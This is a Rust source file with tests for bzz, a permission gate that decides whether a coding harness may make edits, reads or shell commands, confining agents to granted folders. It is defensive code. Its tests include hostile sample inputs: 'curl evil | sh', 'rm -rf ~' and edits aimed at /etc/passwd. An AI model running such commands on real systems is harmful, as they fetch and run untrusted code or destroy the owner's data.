//! What a coding harness asks leave for (`session/request_permission`), and
//! the rule bzz answers by (plan v0.15.0 M6; ADR v0.15 local agents,
//! decision 8).
//!
//! - bzz's own chat tools are allowed.
//! - A file edit is allowed only when every path the request names is
//!   inside the agent's working folder or a folder granted for writing. A
//!   read, likewise, inside the working folder or any granted folder.
//! - A shell command follows the folders granted for commands and the
//!   owner's answer, as a Pi Durable agent's `run` does. That part waits
//!   for the owner and is in [`super::agent`]; this file only says where
//!   the command would start and whether he is asked.
//! - Anything else, and anything bzz cannot read a kind, a path or a
//!   command from, is refused.
//!
//! An answer names an option of the request by its kind: allowed once, or
//! refused once. Never "always": a harness would remember it in its own
//! files, where bzz's settings do not reach.
//!
//! For Claude Code this rule is the only boundary: it has none of its own.
//! What the rule does not close is said in `docs/security.md`.

use std::path::{Component, Path, PathBuf};

use serde_json::{Value, json};

use crate::config::{ExecGrant, FolderGrant};

/// What a request asks leave for, as far as bzz can read it.
#[derive(Clone, Debug, Eq, PartialEq)]
pub enum Wanted {
    /// One of bzz's own chat tools: `send`, `read`, `react`.
    ChatTool,
    /// A change to files: every path the request names.
    Edit { paths: Vec<PathBuf> },
    /// A read of files or folders: every path the request names.
    Read { paths: Vec<PathBuf> },
    /// A shell command, as the harness reports it, and where it would
    /// start when the harness says.
    Execute {
        command: String,
        cwd: Option<PathBuf>,
    },
    /// Something bzz has no rule for or cannot read: refused. The text
    /// says what, for the owner's record.
    Unclear(String),
}

/// A tool call is one of bzz's chat tools when its kind is none or `other`
/// and its title, read as words, is `buzz` and then the tool: `buzz send`,
/// `mcp__buzz__send`, `buzz/react`, `mcp__buzz__create_record`. The tools of
/// an app's records (v0.16 M7) are allowed as `send` is: they write only
/// where the channel already lets the agent write, inside the fence bzz
/// checks where it serves them.
pub fn is_chat_tool(tool: &Value) -> bool {
    // A tool that runs, edits, deletes or moves something is never ours.
    if !matches!(
        tool.get("kind").and_then(Value::as_str),
        None | Some("other")
    ) {
        return false;
    }
    let title = tool
        .get("title")
        .and_then(Value::as_str)
        .unwrap_or_default()
        .to_ascii_lowercase();
    let words = title
        .split(|character: char| !character.is_ascii_alphanumeric())
        .filter(|word| !word.is_empty() && !matches!(*word, "mcp" | "tool"))
        .collect::<Vec<_>>();
    match words.as_slice() {
        ["buzz", tool @ ..] if !tool.is_empty() => super::tools::is_name(&tool.join("_")),
        _ => false,
    }
}

/// The most tool calls of one turn that are kept, and the most bytes of
/// one text of a call's input. Past either, a request that names only its
/// call is one bzz cannot read: refused.
pub const MAX_CALLS: usize = 256;
const MAX_INPUT_TEXT: usize = 100_000;

/// What is kept of a tool call a harness reported (`tool_call` and
/// `tool_call_update` of `session/update`), laid over what was kept before.
///
/// A harness may ask leave for a call by its id alone: Codex does, for a
/// tool of an MCP server and for a file change. What it asks leave for is
/// then what it reported under that id.
pub fn remember(kept: &mut Value, update: &Value) {
    if !kept.is_object() {
        *kept = json!({});
    }
    for name in ["kind", "title", "locations", "_meta"] {
        if let Some(value) = update.get(name).filter(|value| !value.is_null()) {
            kept[name] = value.clone();
        }
    }
    // The input, without a text so long that it is a file's content.
    if let Some(input) = update.get("rawInput").and_then(Value::as_object) {
        let mut input = input.clone();
        input.retain(|_, value| {
            value
                .as_str()
                .is_none_or(|text| text.len() <= MAX_INPUT_TEXT)
        });
        kept["rawInput"] = Value::Object(input);
    }
    // Of a diff, which file: never its text.
    if let Some(content) = update.get("content").and_then(Value::as_array) {
        kept["content"] = content
            .iter()
            .filter(|entry| entry.get("type").and_then(Value::as_str) == Some("diff"))
            .map(|entry| json!({"type": "diff", "path": entry.get("path")}))
            .collect();
    }
}

/// Codex reports a tool of an MCP server as a call of kind `execute`, with
/// the server and the tool in its input, and marks it.
fn codex_mcp_tool(reported: &Value) -> Option<(&str, &str)> {
    (reported.pointer("/_meta/is_mcp_tool_call") == Some(&json!(true))).then_some(())?;
    Some((
        reported.pointer("/rawInput/server")?.as_str()?,
        reported.pointer("/rawInput/tool")?.as_str()?,
    ))
}

/// Paths a request names in the places the three programs put them: the
/// call's `locations`, the files of its diffs, and the path of its input.
fn named_paths(tool: &Value, paths: &mut Vec<PathBuf>) {
    let mut add = |value: Option<&Value>| {
        if let Some(path) = value.and_then(Value::as_str) {
            let path = PathBuf::from(path);
            if !paths.contains(&path) {
                paths.push(path);
            }
        }
    };
    for location in tool
        .get("locations")
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
    {
        add(location.get("path"));
    }
    for content in tool
        .get("content")
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
        .filter(|content| content.get("type").and_then(Value::as_str) == Some("diff"))
    {
        add(content.get("path"));
    }
    for name in ["file_path", "path", "notebook_path"] {
        add(tool.pointer(&format!("/rawInput/{name}")));
    }
}

/// Reads `session/request_permission`. `reported` is what the harness
/// reported of the call the request names ([`remember`]), when it did: the
/// request's own words count first, and every path of either counts.
pub fn read(params: &Value, reported: Option<&Value>) -> Wanted {
    let asked = params.get("toolCall").unwrap_or(&Value::Null);
    let reported = reported.unwrap_or(&Value::Null);
    let member = |name: &str| {
        asked
            .get(name)
            .filter(|value| !value.is_null())
            .or_else(|| reported.get(name))
            .cloned()
            .unwrap_or(Value::Null)
    };
    let tool = json!({
        "kind": member("kind"),
        "title": member("title"),
        "rawInput": member("rawInput"),
    });
    // A tool of an MCP server, as Codex reports one: bzz's own, or not.
    if asked.pointer("/rawInput/command").is_none()
        && let Some((server, name)) = codex_mcp_tool(reported)
    {
        return if server == "buzz" && super::tools::is_name(name) {
            Wanted::ChatTool
        } else {
            Wanted::Unclear(format!(
                "a tool of another server: {}",
                crate::protocol::artifact::display(&format!("{server}.{name}"), 120)
            ))
        };
    }
    if is_chat_tool(&tool) {
        return Wanted::ChatTool;
    }
    let tool = &tool;
    let kind = tool.get("kind").and_then(Value::as_str);
    match kind {
        Some(kind @ ("edit" | "read" | "search")) => {
            let mut paths = Vec::new();
            named_paths(asked, &mut paths);
            named_paths(reported, &mut paths);
            if paths.is_empty() {
                return Wanted::Unclear(format!("a request of kind `{kind}` that names no path"));
            }
            if kind == "edit" {
                Wanted::Edit { paths }
            } else {
                Wanted::Read { paths }
            }
        }
        Some("execute") => {
            let command = match tool.pointer("/rawInput/command") {
                Some(Value::String(command)) => Some(command.clone()),
                // As a list of words, when every one is text.
                Some(Value::Array(words)) => words
                    .iter()
                    .map(Value::as_str)
                    .collect::<Option<Vec<_>>>()
                    .map(|words| words.join(" ")),
                _ => None,
            };
            match command {
                Some(command) => Wanted::Execute {
                    command,
                    cwd: tool
                        .pointer("/rawInput/cwd")
                        .and_then(Value::as_str)
                        .map(PathBuf::from),
                },
                None => Wanted::Unclear("a command bzz could not read".into()),
            }
        }
        // Deleting and moving are not asked for by any of the three
        // programs as such; with no request seen, there is no rule.
        Some(kind) => Wanted::Unclear(format!(
            "a request of kind `{}`",
            crate::protocol::artifact::display(kind, 40)
        )),
        None => Wanted::Unclear("a request that names no kind".into()),
    }
}

/// The answer to a request: the option that allows once, or the one that
/// refuses once, named by its kind and never by an id bzz made up. With no
/// such option the request is cancelled, which allows nothing.
pub fn answer(params: &Value, allow: bool) -> Value {
    let wanted = if allow { "allow_once" } else { "reject_once" };
    let option = params
        .get("options")
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
        .find(|option| option.get("kind").and_then(Value::as_str) == Some(wanted))
        .and_then(|option| option.get("optionId").cloned());
    match option {
        Some(option) => json!({"outcome": {"outcome": "selected", "optionId": option}}),
        None => json!({"outcome": {"outcome": "cancelled"}}),
    }
}

/// Where `path` really is: links followed as far as the path exists, and
/// what does not exist yet appended. `None` for a path that is not
/// absolute, that holds `..`, or whose existing part cannot be resolved (a
/// link to nowhere): in each case bzz cannot say where a write would land.
pub fn resolve(path: &Path) -> Option<PathBuf> {
    if !path.is_absolute()
        || path
            .components()
            .any(|part| matches!(part, Component::ParentDir))
    {
        return None;
    }
    let mut existing = path.to_path_buf();
    let mut missing = Vec::new();
    while std::fs::symlink_metadata(&existing).is_err() {
        missing.push(existing.file_name()?.to_owned());
        existing = existing.parent()?.to_path_buf();
    }
    let mut resolved = std::fs::canonicalize(&existing).ok()?;
    resolved.extend(missing.iter().rev());
    Some(resolved)
}

/// The folders an agent may write in and may read in, each as it really is.
#[derive(Clone, Debug, Default, Eq, PartialEq)]
pub struct Roots {
    write: Vec<PathBuf>,
    read: Vec<PathBuf>,
}

impl Roots {
    /// The working folder, and the granted folders. A folder that is not
    /// there is no root.
    pub fn new(workspace: &Path, folders: &[FolderGrant]) -> Self {
        let mut roots = Self::default();
        if let Ok(workspace) = std::fs::canonicalize(workspace) {
            roots.write.push(workspace.clone());
            roots.read.push(workspace);
        }
        for folder in folders {
            if let Ok(path) = std::fs::canonicalize(&folder.path) {
                if folder.write {
                    roots.write.push(path.clone());
                }
                roots.read.push(path);
            }
        }
        roots
    }

    fn holds(roots: &[PathBuf], paths: &[PathBuf]) -> bool {
        !paths.is_empty()
            && paths.iter().all(|path| {
                resolve(path).is_some_and(|path| roots.iter().any(|root| path.starts_with(root)))
            })
    }

    /// Whether every one of `paths` is inside a folder the agent may write
    /// in. No path at all is a no.
    pub fn may_write(&self, paths: &[PathBuf]) -> bool {
        Self::holds(&self.write, paths)
    }

    pub fn may_read(&self, paths: &[PathBuf]) -> bool {
        Self::holds(&self.read, paths)
    }
}

/// Where a coding harness's command counts as starting, and whether the
/// owner is asked.
#[derive(Clone, Debug, Eq, PartialEq)]
pub struct CommandPlace {
    /// The names of the grants that let it run.
    pub folders: Vec<String>,
    /// Where it starts.
    pub path: PathBuf,
    pub asks: bool,
}

/// Decides, from the folders granted for commands, whether a command of a
/// coding harness may run at all, and whether the owner is asked first.
///
/// - A command that would start inside a granted folder follows that
///   folder: no grant for commands there is a no.
/// - A command that would start in the agent's own working folder, or
///   whose request does not say where, follows every folder granted for
///   commands: none is a no, and the owner is asked unless all of them are
///   allowed without asking. A command is not held in the folder it starts
///   in, so the strictest of the grants decides.
/// - A command that would start anywhere else is a no.
pub fn command_place(
    folders: &[FolderGrant],
    workspace: &Path,
    cwd: Option<&Path>,
) -> Result<CommandPlace, &'static str> {
    let inside = |path: &Path, root: &Path| {
        std::fs::canonicalize(root).is_ok_and(|root| path.starts_with(root))
    };
    let start = match cwd {
        Some(cwd) => Some(resolve(cwd).ok_or("bzz could not tell where it would start")?),
        None => None,
    };
    if let Some(start) = &start
        && !inside(start, workspace)
    {
        // The deepest granted folder that holds it decides.
        let granted = folders
            .iter()
            .filter(|folder| inside(start, &folder.path))
            .max_by_key(|folder| folder.path.components().count())
            .ok_or("it would start in a folder that is neither the agent's own nor granted")?;
        return match granted.exec {
            ExecGrant::No => Err("the folder it would start in is not granted for commands"),
            exec => Ok(CommandPlace {
                folders: vec![granted.name.clone()],
                path: start.clone(),
                asks: exec == ExecGrant::Ask,
            }),
        };
    }
    let granted = folders
        .iter()
        .filter(|folder| folder.exec.granted())
        .collect::<Vec<_>>();
    if granted.is_empty() {
        return Err("no folder is granted for commands");
    }
    Ok(CommandPlace {
        folders: granted.iter().map(|folder| folder.name.clone()).collect(),
        path: start.unwrap_or_else(|| workspace.to_path_buf()),
        asks: granted.iter().any(|folder| folder.exec == ExecGrant::Ask),
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn options() -> Value {
        json!([
            {"optionId": "always", "name": "Always", "kind": "allow_always"},
            {"optionId": "yes", "name": "Allow", "kind": "allow_once"},
            {"optionId": "no", "name": "Reject", "kind": "reject_once"},
            {"optionId": "never", "name": "Never", "kind": "reject_always"},
        ])
    }

    #[test]
    fn an_answer_is_once_by_kind_and_never_always() {
        let request = json!({"options": options()});
        let selected = |id: &str| json!({"outcome": {"outcome": "selected", "optionId": id}});
        assert_eq!(answer(&request, true), selected("yes"));
        assert_eq!(answer(&request, false), selected("no"));
        // Only "always" on offer: nothing is selected, either way.
        let cancelled = json!({"outcome": {"outcome": "cancelled"}});
        let only_always = json!({"options": [
            {"optionId": "always", "kind": "allow_always"},
            {"optionId": "never", "kind": "reject_always"},
        ]});
        assert_eq!(answer(&only_always, true), cancelled);
        assert_eq!(answer(&only_always, false), cancelled);
        assert_eq!(answer(&json!({}), true), cancelled);
        // As Codex names its options.
        let codex = json!({"options": [
            {"optionId": "allow_once", "kind": "allow_once"},
            {"optionId": "accept_execpolicy_amendment", "kind": "allow_always"},
            {"optionId": "cancel", "kind": "reject_once"},
        ]});
        assert_eq!(answer(&codex, true), selected("allow_once"));
        assert_eq!(answer(&codex, false), selected("cancel"));
    }

    #[test]
    fn each_kind_of_request_is_read_as_the_three_programs_send_it() {
        let ask = |tool: Value| read(&json!({"sessionId": "s", "toolCall": tool}), None);
        // Claude Code and Grok name bzz's tools like this.
        for title in ["mcp__buzz__send", "buzz__send", "buzz.read", "buzz/react"] {
            assert_eq!(
                ask(json!({"title": title, "kind": "other"})),
                Wanted::ChatTool
            );
        }
        // The tools of an app's records are bzz's, as `send` is (v0.16 M7).
        #[cfg(feature = "apps")]
        for title in [
            "mcp__buzz__records",
            "mcp__buzz__update_record",
            "buzz/apps",
        ] {
            assert_eq!(ask(json!({"title": title})), Wanted::ChatTool, "{title}");
        }
        for title in [
            "mcp__buzz__record",
            "mcp__buzz__update",
            "mcp__buzz__",
            "buzz send send",
        ] {
            assert_ne!(ask(json!({"title": title})), Wanted::ChatTool, "{title}");
        }
        assert_ne!(
            ask(json!({"title": "mcp__buzz__delete_record", "kind": "delete"})),
            Wanted::ChatTool,
            "a tool that deletes is never taken for ours by its title"
        );
        // Claude Code's Write: the path three times over.
        assert_eq!(
            ask(json!({
                "toolCallId": "t", "name": "Write", "kind": "edit", "title": "Write /w/a.txt",
                "rawInput": {"file_path": "/w/a.txt", "content": "hi\n"},
                "content": [{"type": "diff", "path": "/w/a.txt", "oldText": null, "newText": "hi\n"}],
                "locations": [{"path": "/w/a.txt"}],
            })),
            Wanted::Edit {
                paths: vec!["/w/a.txt".into()]
            }
        );
        // Every path counts, wherever it is named.
        assert_eq!(
            ask(json!({
                "kind": "edit",
                "rawInput": {"file_path": "/w/a.txt"},
                "content": [{"type": "diff", "path": "/etc/passwd"}, {"type": "content", "path": "/x"}],
            })),
            Wanted::Edit {
                paths: vec!["/etc/passwd".into(), "/w/a.txt".into()]
            }
        );
        assert_eq!(
            ask(json!({"kind": "read", "locations": [{"path": "/w/a.txt", "line": 3}]})),
            Wanted::Read {
                paths: vec!["/w/a.txt".into()]
            }
        );
        // Claude Code's Bash, and Codex's command with where it starts.
        assert_eq!(
            ask(json!({"name": "Bash", "kind": "execute", "title": "ls",
                "rawInput": {"command": "ls -la", "description": "List"}})),
            Wanted::Execute {
                command: "ls -la".into(),
                cwd: None
            }
        );
        assert_eq!(
            ask(json!({"title": "Run command", "kind": "execute",
                "rawInput": {"command": ["touch", "/x"], "cwd": "/w"}})),
            Wanted::Execute {
                command: "touch /x".into(),
                cwd: Some("/w".into())
            }
        );
        // What bzz cannot read, or has no rule for.
        for unclear in [
            json!({"kind": "edit", "title": "Edit something"}),
            json!({"kind": "execute", "title": "rm -rf ~"}),
            json!({"kind": "execute", "rawInput": {"command": {"argv": ["rm"]}}}),
            json!({"kind": "execute", "rawInput": {"command": ["rm", 7]}}),
            json!({"kind": "delete", "locations": [{"path": "/w/a.txt"}]}),
            json!({"kind": "move", "locations": [{"path": "/w/a.txt"}]}),
            json!({"kind": "fetch", "title": "Fetch https://example.org"}),
            json!({"kind": "switch_mode", "title": "Ready to code?"}),
            json!({"title": "mcp__postgres__query", "kind": "other"}),
            json!({"title": "mcp__buzz__send", "kind": "execute"}),
            json!({"title": "something"}),
            json!({}),
        ] {
            assert!(
                matches!(ask(unclear.clone()), Wanted::Unclear(_)),
                "{unclear}"
            );
        }
        assert!(matches!(read(&json!({}), None), Wanted::Unclear(_)));
    }

    #[test]
    fn a_request_that_names_only_its_call_is_read_from_what_was_reported() {
        // As Codex 0.166 asks leave for a tool of an MCP server: the
        // request holds an id and a kind, the call was reported before.
        let request = json!({
            "_meta": {"is_mcp_tool_approval": true},
            "sessionId": "s",
            "toolCall": {"kind": "execute", "status": "pending", "toolCallId": "exec-1"},
            "options": [],
        });
        let reported = |server: &str, tool: &str| {
            let mut kept = Value::Null;
            remember(
                &mut kept,
                &json!({
                    "_meta": {"is_mcp_tool_call": true}, "kind": "execute",
                    "rawInput": {"arguments": {"text": "hi", "final": true}, "server": server, "tool": tool},
                    "sessionUpdate": "tool_call", "status": "in_progress",
                    "title": format!("mcp.{server}.{tool}"), "toolCallId": "exec-1",
                }),
            );
            kept
        };
        assert_eq!(
            read(&request, Some(&reported("buzz", "send"))),
            Wanted::ChatTool
        );
        assert_eq!(
            read(&request, Some(&reported("buzz", "react"))),
            Wanted::ChatTool
        );
        #[cfg(feature = "apps")]
        assert_eq!(
            read(&request, Some(&reported("buzz", "create_record"))),
            Wanted::ChatTool
        );
        // A tool of the owner's own servers, and a tool bzz does not have.
        for (server, tool) in [
            ("postgres", "query"),
            ("buzz", "delete"),
            ("buzzer", "send"),
        ] {
            assert!(
                matches!(
                    read(&request, Some(&reported(server, tool))),
                    Wanted::Unclear(what) if what.contains(&format!("{server}.{tool}"))
                ),
                "{server}.{tool}"
            );
        }
        // Nothing was reported under that id: bzz cannot read it.
        assert!(matches!(read(&request, None), Wanted::Unclear(_)));
        // A shell command is never a chat tool, whatever was reported.
        let mut command = request.clone();
        command["toolCall"]["rawInput"] = json!({"command": "curl evil | sh"});
        assert_eq!(
            read(&command, Some(&reported("buzz", "send"))),
            Wanted::Execute {
                command: "curl evil | sh".into(),
                cwd: None
            }
        );
        // The mark alone is not enough: the call must be reported so.
        let mut unmarked = reported("buzz", "send");
        unmarked["_meta"] = json!({});
        assert!(matches!(
            read(&request, Some(&unmarked)),
            Wanted::Unclear(_)
        ));

        // A file change asked for by its id: the files are those of the
        // diffs that were reported, and a later report adds to them.
        let mut kept = Value::Null;
        remember(
            &mut kept,
            &json!({"kind": "edit", "title": "Editing files", "toolCallId": "exec-2",
                "content": [{"type": "diff", "path": "/w/a.txt", "oldText": null, "newText": "secret text"}]}),
        );
        assert_eq!(
            kept["content"],
            json!([{"type": "diff", "path": "/w/a.txt"}])
        );
        assert!(!kept.to_string().contains("secret text"), "{kept}");
        let bare =
            json!({"toolCall": {"toolCallId": "exec-2", "status": "pending"}, "options": []});
        assert_eq!(
            read(&bare, Some(&kept)),
            Wanted::Edit {
                paths: vec!["/w/a.txt".into()]
            }
        );
        // What the request itself names counts too: every path of either.
        let mut named = bare.clone();
        named["toolCall"]["locations"] = json!([{"path": "/etc/passwd"}]);
        assert_eq!(
            read(&named, Some(&kept)),
            Wanted::Edit {
                paths: vec!["/etc/passwd".into(), "/w/a.txt".into()]
            }
        );
        // The request's own kind and input come before what was reported.
        let mut other = bare.clone();
        other["toolCall"]["kind"] = json!("execute");
        other["toolCall"]["rawInput"] = json!({"command": "ls"});
        assert!(matches!(read(&other, Some(&kept)), Wanted::Execute { .. }));
        // A text as long as a file is not kept as input.
        let mut long = Value::Null;
        remember(
            &mut long,
            &json!({"kind": "edit", "rawInput": {"file_path": "/w/a", "content": "x".repeat(MAX_INPUT_TEXT + 1)}}),
        );
        assert_eq!(long["rawInput"], json!({"file_path": "/w/a"}));
    }

    #[cfg(unix)]
    #[test]
    fn an_edit_is_allowed_only_inside_the_working_folder_and_folders_granted_for_writing() {
        let temporary = tempfile::TempDir::new().unwrap();
        let root = std::fs::canonicalize(temporary.path()).unwrap();
        let folder = |name: &str| {
            let path = root.join(name);
            std::fs::create_dir_all(&path).unwrap();
            path
        };
        let (workspace, work, docs, outside) = (
            folder("agent/workspace"),
            folder("work"),
            folder("docs"),
            folder("outside"),
        );
        let roots = Roots::new(
            &workspace,
            &[
                FolderGrant {
                    name: "work".into(),
                    path: work.clone(),
                    write: true,
                    exec: ExecGrant::No,
                },
                FolderGrant::read_only("docs", &docs),
                // A grant whose folder is gone is no root.
                FolderGrant {
                    name: "gone".into(),
                    path: root.join("gone"),
                    write: true,
                    exec: ExecGrant::No,
                },
            ],
        );
        let write = |path: PathBuf| roots.may_write(&[path]);
        let read = |path: PathBuf| roots.may_read(&[path]);
        // Inside: files that exist, files and folders that do not yet.
        std::fs::write(workspace.join("notes.md"), "x").unwrap();
        assert!(write(workspace.join("notes.md")));
        assert!(write(workspace.join("new/deep/file.txt")));
        assert!(write(work.join("a.txt")));
        // Read-only: read, not written.
        assert!(read(docs.join("a.md")) && !write(docs.join("a.md")));
        assert!(read(work.join("a.txt")) && read(workspace.join("notes.md")));
        // Outside, a sibling whose name starts like the folder's, the
        // folder's parent, and the folder that is gone.
        assert!(!write(outside.join("a.txt")) && !read(outside.join("a.txt")));
        assert!(!write(root.join("work2/a.txt")));
        assert!(!write(root.join("agent/started.json")));
        assert!(!write(root.join("gone/a.txt")));
        assert!(!write("/etc/passwd".into()));
        // `..`, and a path that is not absolute: bzz cannot say where.
        assert!(!write(workspace.join("../../outside/a.txt")));
        assert!(!write(workspace.join("sub/../notes.md")));
        assert!(!write("notes.md".into()) && !write("".into()));
        // A link inside the folder that leads out of it, to a file, to a
        // folder, and to nowhere.
        std::fs::write(outside.join("secret"), "s").unwrap();
        std::os::unix::fs::symlink(outside.join("secret"), workspace.join("link-file")).unwrap();
        std::os::unix::fs::symlink(&outside, workspace.join("link-dir")).unwrap();
        std::os::unix::fs::symlink(outside.join("not-there"), workspace.join("link-nowhere"))
            .unwrap();
        assert!(!write(workspace.join("link-file")) && !read(workspace.join("link-file")));
        assert!(!write(workspace.join("link-dir/new.txt")));
        assert!(!write(workspace.join("link-nowhere")));
        // A link that stays inside is fine.
        std::os::unix::fs::symlink(workspace.join("notes.md"), workspace.join("link-in")).unwrap();
        assert!(write(workspace.join("link-in")));
        // The working folder reached through a link is still itself.
        std::os::unix::fs::symlink(&workspace, root.join("alias")).unwrap();
        assert!(write(root.join("alias/notes.md")));
        // Every path must be inside, and there must be one.
        assert!(!roots.may_write(&[workspace.join("a"), outside.join("b")]));
        assert!(roots.may_write(&[workspace.join("a"), work.join("b")]));
        assert!(!roots.may_write(&[]) && !roots.may_read(&[]));
    }

    #[cfg(unix)]
    #[test]
    fn a_command_follows_the_folders_granted_for_commands() {
        let temporary = tempfile::TempDir::new().unwrap();
        let root = std::fs::canonicalize(temporary.path()).unwrap();
        let grant = |name: &str, exec| {
            let path = root.join(name);
            std::fs::create_dir_all(&path).unwrap();
            FolderGrant {
                name: name.into(),
                path,
                write: false,
                exec,
            }
        };
        let workspace = root.join("workspace");
        std::fs::create_dir_all(&workspace).unwrap();
        let (docs, work, ops) = (
            grant("docs", ExecGrant::No),
            grant("work", ExecGrant::Ask),
            grant("ops", ExecGrant::WithoutAsking),
        );
        let place =
            |folders: &[FolderGrant], cwd: Option<&Path>| command_place(folders, &workspace, cwd);
        // No folder for commands: none runs, wherever it would start.
        assert_eq!(
            place(std::slice::from_ref(&docs), None),
            Err("no folder is granted for commands")
        );
        assert_eq!(
            place(&[], Some(&workspace)),
            Err("no folder is granted for commands")
        );
        // In its own folder, or nowhere said: the strictest grant decides.
        let all = [docs.clone(), work.clone(), ops.clone()];
        let asked = place(&all, None).unwrap();
        assert_eq!(asked.folders, ["work", "ops"]);
        assert!(asked.asks);
        assert_eq!(asked.path, workspace);
        assert!(place(&all, Some(&workspace.join("sub"))).unwrap().asks);
        let unasked = place(&[docs.clone(), ops.clone()], None).unwrap();
        assert!(!unasked.asks);
        assert_eq!(unasked.folders, ["ops"]);
        // Inside a granted folder: that folder decides.
        let in_ops = place(&all, Some(&ops.path.join("deploy"))).unwrap();
        assert_eq!(
            (in_ops.folders.clone(), in_ops.asks),
            (vec!["ops".to_owned()], false)
        );
        assert_eq!(in_ops.path, ops.path.join("deploy"));
        assert!(place(&all, Some(&work.path)).unwrap().asks);
        assert_eq!(
            place(&all, Some(&docs.path)),
            Err("the folder it would start in is not granted for commands")
        );
        // Anywhere else, or somewhere bzz cannot tell.
        assert_eq!(
            place(&all, Some(Path::new("/etc"))),
            Err("it would start in a folder that is neither the agent's own nor granted")
        );
        assert_eq!(
            place(&all, Some(Path::new("relative/dir"))),
            Err("bzz could not tell where it would start")
        );
        assert_eq!(
            place(&all, Some(&workspace.join("../ops"))),
            Err("bzz could not tell where it would start")
        );
    }
}
